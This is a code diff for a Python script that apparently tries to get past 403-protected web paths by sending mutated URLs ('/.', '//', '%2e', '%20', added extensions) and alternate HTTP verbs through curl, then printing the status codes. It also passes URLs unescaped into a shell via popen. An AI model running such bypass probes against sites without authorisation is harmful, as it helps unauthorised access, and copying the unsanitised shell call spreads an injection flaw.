@@ -12,26 +12,62 @@ parser.add_argument("-p", "--path", type=Path, required=True, help="File path do
 parser.add_argument("-ua", "--user-agent", type=str, required=False, help="user-agent header")
 args = parser.parse_args()
 
+# TODO list
 # support for user-aget
 # support for custom header
-# 
+# banner
+
 def make_curl_request(url):
-	print(url)
-	code = popen("curl -k -s -I %s | grep HTTP"%(url)).read()
+	# print(url)
+	curl_req = "curl -k -s -I %s"%(url)
+	print(curl_req)
+	code = popen("%s | grep HTTP"%(curl_req)).read()
 	return code
+
+def get_http_verbs():
+	verbs_dict = {
+		'get' : '-X GET',
+		'post' : '-X POST',
+		'trace' : '-X TRACE',
+		'patch"': '-X PATCH',
+		'put' : '-X PUT'
+	}
+
+	return verbs_dict
+
+def get_headers():
+	headers = {
+
+	}
+	return headers
 
 def make_weird_urls(domain, path):
 	urls = []
-	normal_get = domain + path
-	urls.append(normal_get)
-	normal_post = domain + path + '-X POST'
-	urls.append(normal_post)
+	http_verbs = get_http_verbs()
+
+	urls.append(f"{domain}{path}")
+	urls.append(f"{domain}{path}/.")
+	urls.append(f"{domain}/{path}//")
+	urls.append(f"{domain}/.{path}/./")
+	urls.append(f"{domain}/%2e{path}")
+	urls.append(f"{domain}{path}%20")
+	urls.append(f"{domain}{path}.html")
+	urls.append(f"{domain}{path}.php")
+
+	# HTTP verbs 
+	urls.append(f"{http_verbs['post']} {domain}{path}")
+	urls.append(f"{http_verbs['trace']} {domain}{path}")
+	print(urls)
+	return urls
 
 # TODO: make different urls and pass to make_curl_request 
-def do_bypass(url):
-	code  = make_curl_request(url)
-	status_code = code.split(" ")[1]
-	print(f"{status_code} : {url}")
+def do_bypass(domain, path):
+	# url = domain + path
+	urls = make_weird_urls(domain, path)
+	for url in urls:
+		code  = make_curl_request(url)
+		status_code = code.split(" ")[1]
+		print(f"{status_code} : {url}")
 
 def request_handler(domain, paths):
 	if domain is None:
@@ -40,7 +76,7 @@ def request_handler(domain, paths):
 
 	for path in paths:
 		whole_path = domain + path
-		do_bypass(whole_path)
+		do_bypass(domain, path)
 
 def main():
 	domain = args.domain
